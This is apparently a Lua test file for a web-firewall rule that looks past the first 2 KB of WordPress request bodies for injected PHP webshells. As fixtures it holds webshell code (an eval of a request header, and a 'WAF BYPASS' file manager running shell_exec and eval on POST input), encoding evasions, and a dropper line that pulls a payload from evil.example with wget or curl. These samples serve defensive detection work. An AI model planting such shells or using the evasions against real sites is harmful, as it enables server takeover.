-- Tests for rule 417 (rule_php_webshell_body_deep, WAF_PHP_WEBSHELL_BODY,
-- logonly): 404's PHP-source scorer over the whole body the edge read, when
-- 404's 2 KB head scored nothing.
--
-- The positives rebuild what passed the edge on the fleet:
--   * apolymanseisantoniou.gr (orion, 2026-11-15): a plugin-editor save
--     (admin-ajax action=edit-theme-plugin-file) whose newcontent carried, at
--     line 32 of the plugin, `$a = $_SERVER; … eval\n($a[\n$k]\n);` — an eval
--     of a request header. 404 read only the first 2 KB.
--   * zerooneoliveoil.gr (rigel, 2026-11-17): a file manager's cmd=put / the
--     shell's own editor saving "Simple File Manager - ULTIMATE ANTI-BLANK &
--     WAF BYPASS", whose comment header fills the first 2 KB.
-- The negatives: a legitimate plugin file of the same size (superglobals,
-- method calls named exec / system, literal includes), a large form with no
-- PHP at all (the raw gate), and 404 keeping a head hit for itself.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")
local det = require("cfm_waf_detectors")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

local function urlenc(s)
  return (s:gsub("[^%w%-_%.~]", function(c) return string.format("%%%02X", c:byte()) end))
end

local PLUGIN_HEAD = "<?php\n/**\n * Plugin Name: Call Now Button\n * Version: 1.4.13\n */\n" ..
  "if ( ! defined( 'ABSPATH' ) ) { exit; }\n" ..
  string.rep("define( 'CNB_SOME_CONSTANT', plugin_dir_path( __FILE__ ) ); // ordinary plugin code\n", 30)
local PLUGIN_TAIL = string.rep("add_action( 'init', 'cnb_init' ); // more plugin code\n", 20)
local INJECTION = [[
  $get_sidebar_amf = $_SERVER;
  $boolval_first = 'scandir';
  $get_sidebar_qy = 'HTTP_9C34C2E';
  if (isset($get_sidebar_amf[$get_sidebar_qy])) {
    eval
    ($get_sidebar_amf[
    $get_sidebar_qy]
    );
  }
]]
local SHELL = "13:17 09/11/2026<?php\n/**\n * Simple File Manager - ULTIMATE ANTI-BLANK & WAF BYPASS\n * Version: 3.1\n" ..
  string.rep(" * A long description of the tool, its features and its changelog.\n", 50) .. " */\n" ..
  "if (isset($_POST['cmd'])) { echo shell_exec($_POST['cmd']); }\n" ..
  "if (isset($_POST['code'])) { eval($_POST['code']); }\n"

local function editor_save(content)
  return "nonce=abc123&_wp_http_referer=%2Fwp-admin%2Fplugin-editor.php&newcontent=" .. urlenc(content) ..
         "&action=edit-theme-plugin-file&file=call-now-button%2Fcall-now-button.php&plugin=call-now-button%2Fcall-now-button.php"
end
local function req(body, uri, ct)
  return { uri = uri or "/wp-admin/admin-ajax.php", args = "", method = "POST", raw_uri = uri or "/wp-admin/admin-ajax.php",
           host = "apolymanseisantoniou.gr", ip = "121.127.46.187",
           headers = { host = "apolymanseisantoniou.gr", ["content-type"] = ct or "application/x-www-form-urlencoded; charset=UTF-8",
                       ["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36" },
           body = body, cookie = "wordpress_logged_in_x=a%7Cb" }
end
local function fires(c, label, rid, tag_prefix)
  local hit, reason, _, action, _, got = waf.check(c)
  check(hit == true and got == rid, label .. " — rule " .. rid .. " (got " .. tostring(got) .. " " .. tostring(reason) .. ")")
  if tag_prefix then
    check(type(reason) == "string" and reason:sub(1, #tag_prefix) == tag_prefix,
          label .. " — reason " .. tag_prefix .. "… (got " .. tostring(reason) .. ")")
  end
  return action
end
local function clean(c, label)
  local hit, reason, _, _, _, rid = waf.check(c)
  check(not (hit == true and (rid == 417 or rid == 404)), label .. " — must not fire 404/417 (got " .. tostring(reason) .. ")")
end

-- ── Shipped configuration ──────────────────────────────────────────────────
check(waf.get_config().rule_php_webshell_body_deep == "logonly", "417 ships logonly")
check(fires(req(editor_save(PLUGIN_HEAD .. INJECTION .. PLUGIN_TAIL)), "defaults: the orion plugin-editor save", 417,
            "WAF_PHP_WEBSHELL_BODY:DEEP_RAW_EVAL") == "logonly", "defaults: logonly")

set_only({ rule_php_webshell_body = "challenge_v2", rule_php_webshell_body_deep = "logonly" })

-- ── What passed the edge ───────────────────────────────────────────────────
-- The 404 head alone misses both (this is the gap).
check(det.detect_php_webshell_body(editor_save(PLUGIN_HEAD .. INJECTION .. PLUGIN_TAIL),
      { ["content-type"] = "application/x-www-form-urlencoded" }) == nil, "the 2 KB head alone misses the editor save")
fires(req(editor_save(PLUGIN_HEAD .. INJECTION .. PLUGIN_TAIL)), "plugin-editor save, eval of a header at line 32", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
fires(req("action=mk_file_folder_manager&cmd=put&target=l1_QS50eHQ&content=" .. urlenc(SHELL)),
      "file manager cmd=put of the ANTI-BLANK shell", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
fires(req("content=" .. urlenc(SHELL) .. "&save=1", "/sag.php"), "the shell's own editor saving itself", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
-- Double-encoded `<?` / `$_` still pass the raw gate (%25…).
fires(req("content=" .. urlenc(urlenc(SHELL)) .. "&save=1", "/sag.php"), "double-encoded body", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
-- A JSON body (a REST save) too.
fires(req('{"content":"' .. (string.rep("x", 2500) .. "<?php if(isset($_POST[\\\"c\\\"])){eval($_POST[\\\"c\\\"]);}") .. '"}',
          "/wp-json/x/v1/save", "application/json"), "JSON body, PHP past 2 KB", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")

-- JSON escapes, as json_decode hands them to the app (review 2026-11-17).
fires(req('{"content":"' .. string.rep("x", 2500) ..
          '\\u003c?php if(isset(\\u0024_POST[\\u0022c\\u0022])){eval\\u0028\\u0024_POST[\\u0022c\\u0022]);}"}',
          "/wp-json/x/v1/save", "application/json"), "JSON body with \\u00XX escapes", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
-- `<` raw, `?` encoded, no superglobal: the gate's %3 must let it through.
fires(req("note=" .. string.rep("x", 2500) .. "&content=<%3Fphp eval(base64_decode(%22ZWNobyAx%22));"),
      "<%3Fphp with no superglobal", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
-- A multipart TEXT field (a save form posted as multipart), past 2 KB.
fires(req("--b\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n" .. string.rep("x", 3000) ..
          "\r\n--b\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n" .. SHELL .. "\r\n--b--\r\n",
          "/sag.php", "multipart/form-data; boundary=b"), "multipart text field", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")

-- Fourth review (2026-11-17).
-- A short multipart save: 404 never reads multipart, so 417 reads it at any size.
fires(req("--b\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n<?php system($_GET['c']); ?>\r\n--b--\r\n",
          "/sag.php", "multipart/form-data; boundary=b"), "short multipart text field", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
-- The boundary on a second Content-Type line (PHP gets the lines joined).
do
  local c = req("--b\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n" .. SHELL .. "\r\n--b--\r\n", "/sag.php")
  c.headers["content-type"] = { "multipart/form-data", "boundary=b" }
  fires(c, "multipart, boundary on a second Content-Type line", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
end
-- `$%5FPOST`: the underscore encoded, no `<?`.
fires(req("note=" .. string.rep("x", 2500) .. "&code=eval(base64_decode($%5FPOST[z]));"),
      "$%5FPOST past 2 KB", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
-- Two global callables score 6 with no `<?` and no `$_`.
fires(req("note=" .. string.rep("x", 2500) .. "&code=eval(gzinflate(x));system(y);"),
      "two callables past 2 KB", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
-- 404's head pass does not decode JSON escapes (that is 417's burn-in).
check(det.detect_php_webshell_body('{"c":"\\u003c?php system(\\u0024_GET[1]);"}',
      { ["content-type"] = "application/json" }) == nil, "404 head: JSON escapes not decoded")
check(det.detect_php_webshell_body('{"c":"\\u003c?php system(\\u0024_GET[1]);"}',
      { ["content-type"] = "application/json" }, 32768) ~= nil, "417: JSON escapes decoded")
-- A short urlencoded body with no PHP: the gate keeps it out, nothing fires.
clean(req("name=Maria&email=m%40example.gr&msg=Hello%20there"), "short ordinary form")

-- ── 404 disabled: 417 still runs on its own ───────────────────────────────
set_only({ rule_php_webshell_body = "disabled", rule_php_webshell_body_deep = "logonly" })
fires(req(editor_save(PLUGIN_HEAD .. INJECTION .. PLUGIN_TAIL)), "404 disabled, 417 alone", 417, "WAF_PHP_WEBSHELL_BODY:DEEP_")
set_only({ rule_php_webshell_body = "challenge_v2", rule_php_webshell_body_deep = "logonly" })

-- ── 404 keeps a head hit; 417 then stays silent ────────────────────────────
fires(req(editor_save("<?php eval($_POST['c']); ?>" .. PLUGIN_TAIL .. INJECTION)), "eval in the head", 404, "WAF_PHP_WEBSHELL_BODY:RAW_")

-- ── Legitimate ─────────────────────────────────────────────────────────────
local LEGIT = PLUGIN_HEAD ..
  "  $ref = isset( $_SERVER['HTTP_REFERER'] ) ? esc_url_raw( wp_unslash( $_SERVER['HTTP_REFERER'] ) ) : '';\n" ..
  "  $this->db->exec( $sql );\n  $runner::system( $cmd );\n  include __DIR__ . '/includes/admin.php';\n" ..
  "  require_once 'class-cnb.php';\n  function exec_report( $x ) { return $x; }\n" .. PLUGIN_TAIL
clean(req(editor_save(LEGIT)), "a legitimate plugin file saved through the editor")
local FORM = "title=" .. urlenc(string.rep("Ένα μεγάλο κείμενο άρθρου με <b>HTML</b> και λίστες. ", 120)) .. "&status=publish"
clean(req(FORM, "/wp-admin/post.php"), "a large post form with HTML, no PHP")
clean(req("data=" .. string.rep("a", 30000), "/x"), "a large plain body (raw gate)")
-- A multipart FILE part is 402 / 415's, never this rule's.
clean(req("--b\r\nContent-Disposition: form-data; name=\"x\"; filename=\"a.txt\"\r\n\r\n" .. string.rep("x", 3000) ..
          "<?php eval($_POST['c']);\r\n--b--\r\n", "/x", "multipart/form-data; boundary=b"), "multipart file part")
-- Markers spread over separate ordinary fields do not add up.
clean(req("--b\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nThe $_GET array holds the query.\r\n" ..
          "--b\r\nContent-Disposition: form-data; name=\"b\"\r\n\r\n<?xml version=\"1.0\"?><x/>" .. string.rep(" ", 2500) .. "\r\n" ..
          "--b\r\nContent-Disposition: form-data; name=\"c\"\r\n\r\nWe exec( nothing here.\r\n--b--\r\n",
          "/ticket", "multipart/form-data; boundary=b"), "multipart: markers across fields")
-- A large urlencoded body with only %20 / %2F / %3D escapes stays out of the gate.
check(det.detect_php_webshell_body("q=" .. string.rep("a%20b%2Fc%3Dd%3A", 2000),
      { ["content-type"] = "application/x-www-form-urlencoded" }, 32768) == nil, "%20/%2F/%3D-only body: gate closed")
-- A multipart form of ordinary text (a contact form with an attachment-less body).
clean(req("--b\r\nContent-Disposition: form-data; name=\"msg\"\r\n\r\n" .. string.rep("Γεια σας, θα ήθελα πληροφορίες. ", 150) ..
          "\r\n--b--\r\n", "/contact", "multipart/form-data; boundary=b"), "multipart text form, no PHP")

-- ── Order: 417 runs late, so the logonly body rules keep their headline ────
-- cfm.lua pushes the headline hit alone. At step 15, 417 took the headline
-- (and the push) of a wget || curl dropper from 331, a burn-in rule; it now
-- runs after every rule but 612 and 530 and shows in also_rule_ids.
do
  waf.set_rule("rule_shell_write_exec", "logonly")  -- its shipped mode
  local dropper = "<?php\n" .. string.rep("// padding line of a dropper script\n", 80) ..
    "if(isset($_GET[\"x\"])){ $u=\"http://evil.example/a.txt\"; @system(\"wget -q $u -O /tmp/a.php || curl -s -o /tmp/a.php $u\"); }\n"
  local hit, reason, _, _, hits, rid = waf.check(req("action=put&content=" .. urlenc(dropper)))
  check(hit == true and rid == 331, "dropper: 331 keeps the headline (got " .. tostring(rid) .. " " .. tostring(reason) .. ")")
  local also = waf.also_rule_ids(hits, rid) or {}
  local seen = false
  for _, id in ipairs(also) do if id == 417 then seen = true end end
  check(seen, "dropper: 417 in also_rule_ids")
  waf.set_rule("rule_shell_write_exec", "disabled")
  -- Source order: 417's record sits after 331's and the 42x/43x scanners, before 612's.
  local f = assert(io.open("configs/lua/cfm_waf.lua")); local src = f:read("*a"); f:close()
  local at417 = src:find("RULE_IDS.rule_php_webshell_body_deep", 1, true)
  local at331 = src:find("RULE_IDS.rule_shell_write_exec", 1, true)
  local at43x = src:find("RULE_IDS.rule_htaccess_poisoning", 1, true)
  local at612 = src:find("RULE_IDS.rule_fetch_metadata_missing", 1, true)
  check(at417 and at331 and at43x and at612 and at331 < at417 and at43x < at417 and at417 < at612,
        "417 runs after 331 / 430 and before 612")
end

-- ── Rule 415's tag names the file's extension (its burn-in needed it) ─────
do
  local function mp(fname, data)
    return "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"" .. fname ..
           "\"\r\nContent-Type: text/plain\r\n\r\n" .. data .. "\r\n--b--\r\n"
  end
  local H = { ["content-type"] = "multipart/form-data; boundary=b" }
  local pad = string.rep("13:17 09/11/2026", 200)  -- the krs.php / tig.php padding
  check(det.detect_upload_content_deep(mp("A.txt", pad .. "<?php echo 1;"), H) == "UPLOAD_PHP_TAG_DEEP:txt", "415 tag: .txt")
  check(det.detect_upload_content_deep(mp("Photo.JPG", pad .. "<?php echo 1;"), H) == "UPLOAD_PHP_TAG_DEEP:jpg", "415 tag: lowercased")
  check(det.detect_upload_content_deep(mp("noext", pad .. "<?php echo 1;"), H) == "UPLOAD_PHP_TAG_DEEP:none", "415 tag: no extension")
  check(det.detect_upload_content_deep(mp("a.verylongextension", pad .. "<?php echo 1;"), H) == "UPLOAD_PHP_TAG_DEEP:verylong", "415 tag: capped at 8")
  check(det.detect_upload_content_deep(mp("a.p-h.p", pad .. "<?php echo 1;"), H) == "UPLOAD_PHP_TAG_DEEP:p", "415 tag: last segment, alnum only")
end

-- ── Disabled ───────────────────────────────────────────────────────────────
set_only({ rule_php_webshell_body = "challenge_v2", rule_php_webshell_body_deep = "disabled" })
clean(req(editor_save(PLUGIN_HEAD .. INJECTION .. PLUGIN_TAIL)), "417 disabled")

if fails > 0 then
  io.stderr:write(fails .. " failure(s)\n")
  os.exit(1)
end
print("cfm_waf_php_body_deep_test: OK")
